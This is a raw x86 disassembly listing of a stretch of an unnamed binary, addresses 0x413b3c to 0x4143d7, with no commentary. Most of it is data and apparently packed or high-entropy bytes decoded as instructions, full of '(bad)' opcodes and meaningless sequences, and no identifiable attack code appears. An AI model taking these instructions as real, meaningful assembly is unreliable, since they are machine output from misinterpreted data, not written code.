  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
  413ce8:	add    BYTE PTR fs:[ebx+0x0],ch
  413cec:	imul   eax,DWORD PTR [eax],0x6a
  413cef:	add    BYTE PTR [esi+0x0],ah
  413cf2:	add    BYTE PTR fs:[ebx+0x0],dh
  413cf6:	imul   eax,DWORD PTR [eax],0x6a
  413cf9:	add    BYTE PTR [esi+0x0],ah
  413cfc:	imul   eax,DWORD PTR [eax],0x64
  413cff:	add    BYTE PTR [ebx+0x0],dh
  413d02:	add    BYTE PTR [eax],al
  413d04:	dec    edx
  413d05:	inc    esp
  413d06:	dec    ebx
  413d07:	dec    edx
  413d08:	push   0x6b
  413d0a:	fs dec ebx
  413d0c:	dec    esp
  413d0d:	dec    edx
  413d0e:	imul   ebp,DWORD PTR fs:[edx+ecx*2+0x6c],0x4c6a646b
  413d17:	push   ebp
  413d18:	inc    esp
  413d19:	outs   dx,DWORD PTR ds:[esi]
  413d1a:	imul   ebp,DWORD PTR [ebx+esi*2+0x6a],0x6a6b6b64
  413d22:	data16 fs jae 0x413d91
  413d26:	push   0x66
  413d28:	imul   esp,DWORD PTR [ebx+esi*2+0x0],0x0
  413d2d:	add    BYTE PTR [eax],al
  413d2f:	add    BYTE PTR [eax],al
  413d31:	add    BYTE PTR [eax],al
  413d33:	add    BYTE PTR [ebp-0x68],cl
  413d36:	inc    eax
  413d37:	add    BYTE PTR [ebp+0x4f],dl
  413d3a:	pop    edi
  413d3b:	dec    edi
  413d3c:	dec    esp
  413d3d:	dec    edi
  413d3e:	push   eax
  413d3f:	dec    edi
  413d40:	pop    edi
  413d41:	dec    edi
  413d42:	push   esi
  413d43:	dec    edi
  413d44:	or     eax,0xc24f0c4f
  413d49:	dec    esi
  413d4a:	add    BYTE PTR [eax],al
  413d4c:	pop    ecx
  413d4d:	dec    edi
  413d4e:	pop    esi
  413d4f:	dec    edi
  413d50:	pop    ebx
  413d51:	dec    edi
  413d52:	or     eax,0xc24f0c4f
  413d57:	dec    esi
  413d58:	dec    edi
  413d59:	dec    edi
  413d5a:	dec    ebp
  413d5b:	dec    edi
  413d5c:	pop    edi
  413d5d:	dec    edi
  413d5e:	dec    esp
  413d5f:	dec    edi
  413d60:	or     eax,0xc24f0c4f
  413d65:	dec    esi
  413d66:	add    BYTE PTR [eax],al
  413d68:	dec    ebp
  413d69:	dec    edi
  413d6a:	pop    edx
  413d6b:	dec    edi
  413d6c:	push   esi
  413d6d:	dec    edi
  413d6e:	dec    ecx
  413d6f:	dec    edi
  413d70:	arpl   WORD PTR [edi+0x52],cx
  413d73:	dec    edi
  413d74:	pop    ebx
  413d75:	dec    edi
  413d76:	ret    0x4e
  413d79:	add    BYTE PTR [eax],al
  413d7b:	add    BYTE PTR [esi+0x7d],ch
  413d7e:	outs   dx,BYTE PTR ds:[esi]
  413d7f:	lea    ebp,[esi-0x63]
  413d82:	outs   dx,BYTE PTR ds:[esi]
  413d83:	lods   eax,DWORD PTR ds:[esi]
  413d84:	outs   dx,BYTE PTR ds:[esi]
  413d85:	mov    ebp,0xdd6ecd6e
  413d8a:	outs   dx,BYTE PTR ds:[esi]
  413d8b:	in     eax,dx
  413d8c:	outs   dx,BYTE PTR ds:[esi]
  413d8d:	std    
  413d8e:	outs   dx,BYTE PTR ds:[esi]
  413d8f:	or     eax,0x2d6e1d6e
  413d94:	outs   dx,BYTE PTR ds:[esi]
  413d95:	cmp    eax,0x6d6e5d6e
  413d9a:	outs   dx,BYTE PTR ds:[esi]
  413d9b:	jb     0x413e0b
  413d9d:	jae    0x413e0d
  413d9f:	jo     0x413e0f
  413da1:	jno    0x413e11
  413da3:	jbe    0x413e13
  413da5:	ja     0x413e15
  413da7:	je     0x413e17
  413da9:	jne    0x413e19
  413dab:	mov    ch,BYTE PTR [esi-0x75]
  413dae:	outs   dx,BYTE PTR ds:[esi]
  413daf:	mov    BYTE PTR [esi-0x77],ch
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    gs,WORD PTR [esi+0x7c]
  413db6:	pop    esi
  413db7:	jge    0x413e07
  413db9:	jge    0x413d79
  413dbb:	jge    0x413e15
  413dbd:	(bad)  
  413dbe:	jns    0x413e30
  413dc0:	mov    ecx,0x7d736eb1
  413dc5:	bound  ebp,QWORD PTR [edx+0x7c265fc6]
  413dcb:	add    BYTE PTR [ecx+0x17],cl
  413dce:	mov    ebx,0x4af4b956
  413dd3:	aaa    
  413dd4:	dec    edx
  413dd5:	jle    0x413d70
  413dd7:	jno    0x413e39
  413dd9:	mov    cl,0x4
  413ddb:	imul   ebp,DWORD PTR [eax-0x70282bf8],0x5
  413de2:	inc    esp
  413de3:	xlat   BYTE PTR ds:[ebx]
  413de4:	rcl    DWORD PTR [ebx+0x7dd01148],1
  413dea:	rcr    esi,cl
  413dec:	(bad)  
  413ded:	leave  
  413dee:	xchg   BYTE PTR [esi+0x1faa3210],ah
  413df4:	fs icebp 
  413df6:	push   eax
  413df7:	(bad)  
  413df8:	rcr    DWORD PTR [eax],1
  413dfa:	shl    DWORD PTR [ecx+0x0],1
  413dfd:	add    BYTE PTR [eax],al
  413dff:	add    bh,ch
  413e01:	(bad)  [ebx+0x7]
  413e04:	or     BYTE PTR [ecx+eax*2],bh
  413e07:	add    BYTE PTR [esi+0x30],al
  413e0a:	shl    DWORD PTR [ebx],0x38
  413e0d:	and    eax,DWORD PTR [ecx+0x0]
  413e10:	inc    esi
  413e11:	push   ebx
  413e12:	outs   dx,DWORD PTR ds:[esi]
  413e13:	push   ebx
  413e14:	mov    al,ds:0x400413b
  413e19:	cmp    al,0x41
  413e1b:	add    BYTE PTR [edi+0x712ed],cl
	...
  413e3d:	add    BYTE PTR [eax],al
  413e3f:	add    BYTE PTR [edi+0x78],dl
  413e42:	popa   
  413e43:	push   edi
  413e44:	push   esi
  413e45:	push   esp
  413e46:	dec    eax
  413e47:	je     0x413e95
  413e49:	push   ebx
  413e4a:	jne    0x413eb7
  413e4c:	popa   
  413e4d:	jns    0x413e94
  413e4f:	pop    ecx
  413e50:	je     0x413e9a
  413e52:	push   ebp
  413e53:	jp     0x413eab
  413e55:	jp     0x413ed0
  413e57:	js     0x413ec9
  413e59:	imul   edx,DWORD PTR [edi+0x6d],0x48
  413e5d:	push   eax
  413e5e:	dec    eax
  413e5f:	dec    edx
  413e60:	outs   dx,BYTE PTR ds:[esi]
  413e61:	push   esp
  413e62:	pop    ecx
  413e63:	dec    edx
  413e64:	dec    ebx
  413e65:	dec    ebp
  413e66:	dec    esi
  413e67:	je     0x413e69
	...
  413e79:	add    BYTE PTR [eax],al
  413e7b:	add    BYTE PTR [ebp+0x70],ch
  413e7e:	ins    DWORD PTR es:[edi],dx
  413e7f:	push   esp
  413e80:	dec    esi
  413e81:	jne    0x413ed4
  413e83:	outs   dx,BYTE PTR ds:[esi]
  413e84:	imul   eax,DWORD PTR [edx+0x73],0x58516165
  413e8b:	pop    ecx
  413e8c:	outs   dx,BYTE PTR ds:[esi]
  413e8d:	jbe    0x413f07
  413e8f:	jns    0x413f08
  413e91:	dec    ebp
  413e92:	je     0x413f0a
  413e94:	bound  eax,QWORD PTR [ebx+eiz*2+0x7a]
  413e98:	push   esp
  413e99:	arpl   WORD PTR [ecx+0x4b],cx
  413e9c:	push   edx
  413e9d:	imul   ebp,DWORD PTR [eax+0x73],0x6a4a5170
  413ea4:	add    BYTE PTR [eax],al
  413ea6:	inc    edi
  413ea7:	jne    0x413eef
  413ea9:	push   ebx
  413eaa:	outs   dx,DWORD PTR ds:[esi]
  413eab:	push   ebx
  413eac:	inc    esi
  413ead:	inc    edi
  413eae:	push   0x66495949
  413eb3:	imul   ebx,DWORD PTR [edx+0x5a],0x5a
  413eb7:	push   esi
  413eb8:	jb     0x413f22
  413eba:	add    BYTE PTR [eax],al
  413ebc:	ins    BYTE PTR es:[edi],dx
  413ebd:	jb     0x413f38
  413ebf:	inc    edi
  413ec0:	push   edi
  413ec1:	push   esi
  413ec2:	inc    edi
  413ec3:	ins    BYTE PTR es:[edi],dx
  413ec4:	inc    ecx
  413ec5:	inc    edi
  413ec6:	jae    0x413ec8
  413ec8:	dec    edi
  413ec9:	inc    ebx
  413eca:	jo     0x413f3e
  413ecc:	data16 jp 0x413f21
  413ecf:	jp     0x413f29
  413ed1:	ins    BYTE PTR es:[edi],dx
  413ed2:	je     0x413f43
  413ed4:	jns    0x413f44
  413ed6:	popa   
  413ed7:	push   esi
  413ed8:	push   ebp
  413ed9:	push   0x57564476
  413ede:	dec    edx
  413edf:	imul   edx,DWORD PTR [ebx+0x4b],0x5065
  413ee6:	inc    ecx
  413ee7:	jp     0x413f59
  413ee9:	pop    eax
  413eea:	inc    esi
  413eeb:	jae    0x413f62
  413eed:	dec    esi
  413eee:	dec    edx
  413eef:	gs push eax
  413ef1:	jne    0x413ef3
  413ef3:	add    ah,ah
  413ef5:	cmc    
  413ef6:	jnp    0x413f46
  413ef8:	jnp    0x413ec8
  413efa:	cmc    
  413efb:	call   FWORD PTR [ebx+0x61]
  413efe:	and    bh,dl
  413f00:	lahf   
  413f01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413f03:	fcmovu st,st(4)
  413f05:	rol    DWORD PTR [eax],1
  413f07:	add    BYTE PTR [ecx+eax*1],al
  413f0a:	add    BYTE PTR [eax],al
  413f0c:	les    edi,FWORD PTR [edi]
  413f0e:	pop    esi
  413f0f:	adc    ch,bh
  413f11:	and    ebx,DWORD PTR [ebx]
  413f13:	lea    eax,[eax+eiz*8+0x2a]
  413f17:	(bad)  
  413f18:	jmp    0xd530:0xacd8a8c3
  413f1f:	xchg   esp,eax
  413f20:	dec    ax
  413f22:	icebp  
  413f23:	ins    BYTE PTR es:[edi],dx
  413f24:	and    esp,DWORD PTR [esi+0x4ffea92c]
  413f2a:	pop    esi
  413f2b:	inc    esi
  413f2c:	or     edi,DWORD PTR [edx+0x6b73ff0a]
  413f32:	add    eax,0xd87f883c
  413f37:	icebp  
  413f38:	jbe    0x413f72
  413f3a:	mov    ?,WORD PTR [edx+0x57]
  413f3d:	lahf   
  413f3e:	add    al,0x25
  413f40:	adc    BYTE PTR [esi],cl
  413f42:	arpl   WORD PTR [esi+ecx*4-0x59],sp
  413f46:	imul   esp,DWORD PTR [eax-0x6],0xee695f66
  413f4d:	test   al,0xca
  413f4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f50:	xchg   esi,eax
  413f51:	nop
  413f52:	jno    0x413f9e
  413f54:	clc    
  413f55:	stos   BYTE PTR es:[edi],al
  413f56:	xlat   BYTE PTR ds:[ebx]
  413f57:	mov    ah,0xe6
  413f59:	test   eax,0x753cfa54
  413f5e:	call   0x53d8:0x259c42d0
  413f65:	scas   eax,DWORD PTR es:[edi]
  413f66:	and    BYTE PTR cs:[ebx+0x5aa0158d],al
  413f6d:	call   0x2b31c6d5
  413f72:	xchg   BYTE PTR [ecx-0x27ea058b],ah
  413f78:	add    ebx,DWORD PTR [edi]
  413f7a:	push   ecx
  413f7b:	daa    
  413f7c:	push   ecx
  413f7d:	xchg   edi,eax
  413f7e:	mov    esp,ebp
  413f80:	or     al,0xd8
  413f82:	mov    ebp,0xe748cbfc
  413f87:	adc    al,0x30
  413f89:	and    edx,DWORD PTR [ebp+eiz*4+0x604ac8ed]
  413f90:	iret   
  413f91:	mov    al,ds:0x7b6eaef6
  413f96:	push   DWORD PTR [edi-0x21875cc7]
  413f9c:	call   0xaa6c600a
  413fa1:	fild   DWORD PTR [eax]
  413fa3:	sub    edx,ebx
  413fa5:	fbstp  TBYTE PTR ds:0xba7038ca
  413fab:	pushw  es
  413fad:	jbe    0x413f96
  413faf:	lea    esp,[ecx+0x6b]
  413fb2:	pop    sp
  413fb4:	sbb    BYTE PTR [edx+eiz*8-0x40ecef86],dh
  413fbb:	mov    ecx,DWORD PTR ds:0x3c3ce23c
  413fc1:	outs   dx,DWORD PTR ds:[esi]
  413fc2:	ja     0x413fe5
  413fc4:	xor    esi,DWORD PTR [eax-0x2c]
  413fc7:	f2xm1  
  413fc9:	adc    eax,0xf306abea
  413fce:	fld    QWORD PTR [ebx]
  413fd0:	mov    cs:0x5f5c2bce,eax
  413fd6:	and    esi,DWORD PTR [esi+0x4d]
  413fd9:	sbb    DWORD PTR [ecx],edi
  413fdb:	shr    DWORD PTR [eax],1
  413fdd:	cmp    dl,BYTE PTR [edx+0xd]
  413fe0:	shl    edi,1
  413fe2:	fsub   QWORD PTR [ecx-0x8]
  413fe5:	lods   eax,DWORD PTR ds:[esi]
  413fe6:	sbb    al,0xf7
  413fe8:	inc    edx
  413fe9:	xchg   DWORD PTR [ebp-0xe],edi
  413fec:	frstpm(287 only) 
  413fee:	iret   
  413fef:	imul   edi,DWORD PTR [ebp-0x1cc81141],0xbb776343
  413ff9:	push   eax
  413ffa:	xchg   dl,dh
  413ffc:	and    BYTE PTR [ecx+ecx*8-0x7d04df2d],ch
  414003:	in     al,0x18
  414005:	xor    DWORD PTR [ebx+0x57e54d69],edi
  41400b:	dec    edx
  41400c:	(bad)  
  41400d:	neg    BYTE PTR [ecx+0xf6]
	...
  414073:	add    BYTE PTR [edx-0x26],bl
  414076:	push   esi
  414077:	pusha  
  414078:	(bad)  
  414079:	in     al,dx
  41407a:	jle    0x414076
  41407c:	call   0x97bb:0x7ed52e96
  414083:	push   ss
  414084:	loopne 0x414058
  414086:	add    BYTE PTR [eax],al
  414088:	add    al,0x1
  41408a:	add    BYTE PTR [eax],al
  41408c:	enter  0x62a7,0x69
  414090:	cli    
  414091:	outs   dx,DWORD PTR ds:[esi]
  414092:	popa   
  414093:	mov    BYTE PTR ds:[ebx+0x5a865a5f],ah
  41409a:	jbe    0x41410b
  41409c:	lahf   
  41409d:	iret   
  41409e:	out    0xa1,eax
  4140a0:	mov    eax,0x5ddbd67a
  4140a5:	cwde   
  4140a6:	lds    edx,FWORD PTR [eax-0x5688d040]
  4140ac:	les    edi,FWORD PTR [ebx]
  4140ae:	sub    eax,esi
  4140b0:	cmp    ecx,DWORD PTR [eax+ebp*2-0x53]
  4140b4:	push   ss
  4140b5:	clc    
  4140b6:	inc    edx
  4140b7:	js     0x41403c
  4140b9:	sbb    eax,DWORD PTR [ecx-0x13e14cff]
  4140bf:	and    al,BYTE PTR [ecx-0x4b8192a0]
  4140c5:	sbb    edx,DWORD PTR [eax]
  4140c7:	jae    0x41407f
  4140c9:	cmp    esp,DWORD PTR [esi-0x34]
  4140cc:	pause  
  4140ce:	loop   0x41414a
  4140d0:	sti    
  4140d1:	sbb    al,0xdb
  4140d3:	jecxz  0x414066
  4140d5:	shl    DWORD PTR [eax-0x73250d07],0xce
  4140dc:	or     DWORD PTR [esi+0x4],edx
  4140df:	push   eax
  4140e0:	out    0xcf,eax
  4140e2:	jp     0x4140b8
  4140e4:	cli    
  4140e5:	icebp  
  4140e6:	in     eax,dx
  4140e7:	in     eax,0xa8
  4140e9:	daa    
  4140ea:	clc    
  4140eb:	nop
  4140ec:	aam    0x88
  4140ee:	lea    ebp,[edx-0x2fbcab5a]
  4140f4:	cmp    ecx,DWORD PTR [eax+0x46]
  4140f7:	sub    al,ah
  4140f9:	dec    edi
  4140fa:	jbe    0x41413f
  4140fc:	xor    al,0x76
  4140fe:	out    0x1d,eax
  414100:	mov    esp,0xe9960518
  414105:	outs   dx,BYTE PTR ds:[esi]
  414106:	adc    ebp,ebx
  414108:	or     DWORD PTR [edx],esp
  41410a:	push   0x304d1dea
  41410f:	and    al,bh
  414111:	jb     0x4140f2
  414113:	cld    
  414114:	aad    0x72
  414116:	scas   al,BYTE PTR es:[edi]
  414117:	sahf   
  414118:	(bad)  es:[esi+ecx*8+0x24]
  41411d:	lds    ebx,FWORD PTR [edi+esi*4+0x1e901e8c]
  414124:	ins    DWORD PTR es:[edi],dx
  414125:	pop    ss
  414126:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414127:	ficom  WORD PTR [eax+ebx*4+0x71]
  41412b:	pop    ecx
  41412c:	mov    edi,0xecda0f02
  414131:	and    al,0xab
  414133:	js     0x4141ac
  414135:	push   ebx
  414136:	adc    ah,BYTE PTR [ebp-0x3]
  414139:	mov    ebx,0x64beba44
  41413e:	fsub   QWORD PTR [esi]
  414140:	jmp    0x4141b4
  414142:	xchg   edx,eax
  414143:	mov    edx,0x313c6674
  414148:	xchg   BYTE PTR [ecx+0x234d59f4],ch
  41414e:	shl    DWORD PTR [edi],1
  414150:	mov    edi,0x1c3eaa88
  414155:	hlt    
  414156:	add    ebp,DWORD PTR [edi-0x36aa591b]
  41415c:	pop    ebx
  41415d:	imul   esi,DWORD PTR [esp+esi*8-0xe],0xffffff99
  414162:	jmp    0x53910d11
  414167:	mov    ecx,0xe5535594
  41416c:	mov    eax,0x9f77c511
  414171:	add    dl,cl
  414173:	pop    edi
  414174:	sbb    al,0xd
  414176:	dec    esi
  414177:	mov    ds:0x97a0788f,al
  41417c:	push   esp
  41417d:	mov    ds:0x11b9f6e0,al
  414182:	mov    al,0x94
  414184:	sbb    edx,DWORD PTR [edx]
  414186:	cli    
  414187:	xchg   BYTE PTR [ebp+0x52],cl
  41418a:	sub    eax,0xf0975b00
	...
  4141f4:	add    dl,BYTE PTR [edx]
  4141f6:	add    DWORD PTR [ebx-0x4c5d4cef],esp
  4141fc:	mov    DWORD PTR [ecx+0x37],edx
  4141ff:	push   edi
  414200:	mov    al,ds:0xe4aed7c3
  414205:	rol    DWORD PTR [eax],cl
  414207:	add    BYTE PTR [ecx+eax*1],al
  41420a:	add    BYTE PTR [eax],al
  41420c:	int    0x57
  41420e:	xor    al,dl
  414210:	cmc    
  414211:	js     0x4141b0
  414213:	jo     0x414241
  414215:	ins    DWORD PTR es:[edi],dx
  414216:	icebp  
  414217:	cmc    
  414218:	lahf   
  414219:	xor    edx,DWORD PTR gs:[eax]
  41421c:	aas    
  41421d:	cmc    
  41421e:	popf   
  41421f:	sahf   
  414220:	inc    ecx
  414221:	rcl    ebx,1
  414223:	mov    ah,0x21
  414225:	sbb    eax,0x756a40c3
  41422a:	inc    esi
  41422b:	call   0x660f96c7
  414230:	ret    
  414231:	adc    BYTE PTR [ecx+0x30],dh
  414234:	stos   DWORD PTR es:[edi],eax
  414235:	pop    ebx
  414236:	xor    bh,ch
  414238:	pushf  
  414239:	cwde   
  41423a:	popf   
  41423b:	mov    ch,0x40
  41423d:	popf   
  41423e:	scas   al,BYTE PTR es:[edi]
  41423f:	push   edx
  414240:	call   0x458789e
  414245:	push   ecx
  414246:	les    esp,FWORD PTR [ebp-0x7667131d]
  41424c:	enter  0xb4b2,0x35
  414250:	rcl    DWORD PTR [eax],cl
  414252:	xor    BYTE PTR [ecx-0x8302259],bl
  414258:	sar    BYTE PTR [edi],0x26
  41425b:	in     eax,0xc9
  41425d:	lds    esp,FWORD PTR [edi]
  41425f:	clc    
  414260:	cli    
  414261:	pop    esp
  414262:	xor    dl,0xd9
  414265:	sub    cl,BYTE PTR [eax+ebx*4]
  414268:	out    0x9c,eax
  41426a:	aad    0x49
  41426c:	mov    dh,0x89
  41426e:	stc    
  41426f:	imul   edx,DWORD PTR [ebp+0x6cde91d3],0xffffffb1
  414276:	mov    al,0xc
  414278:	push   es
  414279:	adc    eax,0x504eaeb7
  41427e:	mov    ds:0x363d9729,eax
  414283:	retf   0x3575
  414286:	mov    WORD PTR [esi],?
  414288:	and    DWORD PTR [edx],eax
  41428a:	sahf   
  41428b:	stos   BYTE PTR es:[edi],al
  41428c:	mov    ebp,0xe8f42af6
  414291:	retf   
  414292:	into   
  414293:	mov    ds:0x7b96e5ea,eax
  414298:	inc    edi
  414299:	adc    dh,bl
  41429b:	mov    eax,ds:0x914148f
  4142a0:	sar    ebp,1
  4142a2:	fisttp QWORD PTR [ebx]
  4142a4:	xchg   esi,eax
  4142a5:	sub    esi,DWORD PTR [eax-0x77]
  4142a8:	xchg   edi,eax
  4142a9:	jle    0x414283
  4142ab:	push   es
  4142ac:	xchg   ebp,eax
  4142ad:	adc    eax,0xa55b45bb
  4142b2:	addr16 test eax,0x80a9f0b6
  4142b8:	cwde   
  4142b9:	pop    ecx
  4142ba:	jg     0x414252
  4142bc:	and    al,0xff
  4142be:	(bad)  
  4142bf:	push   ebp
  4142c0:	das    
  4142c1:	pop    ebp
  4142c2:	adc    DWORD PTR [esi],esp
  4142c4:	in     eax,dx
  4142c5:	mov    esp,0xe4252c5d
  4142ca:	into   
  4142cb:	mov    bl,0x68
  4142ce:	neg    BYTE PTR [eax-0x74]
  4142d1:	lock dec esi
  4142d3:	imul   edi,DWORD PTR [esi-0x30],0x6a24a4dd
  4142da:	mov    bl,0x2f
  4142dc:	xchg   esi,eax
  4142dd:	retf   
  4142de:	xchg   ebx,eax
  4142df:	pop    esi
  4142e0:	mov    bh,0x7d
  4142e2:	mov    ss,WORD PTR [ecx]
  4142e4:	in     eax,0xdb
  4142e6:	mov    bh,0xb7
  4142e8:	fimul  WORD PTR [esi-0xa]
  4142eb:	xchg   ebp,eax
  4142ec:	push   cs
  4142ed:	inc    ecx
  4142ee:	xlat   BYTE PTR ds:[ebx]
  4142ef:	aam    0xae
  4142f1:	xchg   ebx,eax
  4142f2:	xchg   ebp,eax
  4142f3:	pop    es
  4142f4:	mov    DWORD PTR [ecx],edx
  4142f6:	xchg   edi,eax
  4142f7:	retf   
  4142f8:	jne    0x4142ab
  4142fa:	lds    esi,FWORD PTR [eax-0x6694ca5e]
  414300:	icebp  
  414301:	fs sar ebp,0xeb
  414305:	sub    bh,al
  414307:	fist   WORD PTR [ecx]
  414309:	jnp    0x41435c
  41430b:	dec    ebp
  41430c:	cmp    bl,BYTE PTR [edx+0x38]
  41430f:	sbb    al,0x0
	...
  414371:	add    BYTE PTR [eax],al
  414373:	add    BYTE PTR [ecx],al
  414375:	sub    DWORD PTR [ebp-0x23],0xddb1fded
  41437c:	rol    DWORD PTR [ebp+0x5e],0xa1
  414380:	jl     0x41439e
  414382:	js     0x41437d
  414384:	call   0x441445d
  414389:	add    DWORD PTR [eax],eax
  41438b:	add    BYTE PTR [esi],bh
  41438d:	inc    ebp
  41438e:	pop    ebp
  41438f:	ss xor dh,ch
  414392:	(bad)  
  414393:	push   ss
  414394:	aad    0xc3
  414396:	push   edi
  414397:	pop    ds
  414398:	pop    ss
  414399:	mov    bh,dh
  41439b:	mov    bl,0x87
  41439d:	dec    edi
  41439e:	dec    esp
  41439f:	out    0x2a,al
  4143a1:	popf   
  4143a2:	ins    DWORD PTR es:[edi],dx
  4143a3:	(bad)  
  4143a4:	out    dx,eax
  4143a5:	aaa    
  4143a6:	sbb    DWORD PTR [edi+0x3bd0d2fa],eax
  4143ac:	cmc    
  4143ad:	push   ebx
  4143ae:	pop    edi
  4143af:	ds xchg ebp,eax
  4143b1:	test   eax,0x2a41f703
  4143b6:	cwde   
  4143b7:	in     eax,dx
  4143b8:	repnz add eax,0x542c705c
  4143be:	popa   
  4143bf:	mov    dl,BYTE PTR ds:0x7e20cf1e
  4143c5:	add    eax,DWORD PTR [ecx+0x72]
  4143c8:	and    DWORD PTR [edx],ecx
  4143ca:	sti    
  4143cb:	fs aaa 
  4143cd:	in     eax,dx
  4143ce:	jno    0x41443c
  4143d0:	or     esp,esp
  4143d2:	into   
  4143d3:	or     dh,BYTE PTR [edi]
  4143d5:	(bad)  
  4143d6:	popf   
  4143d7:	xchg   ebp,eax
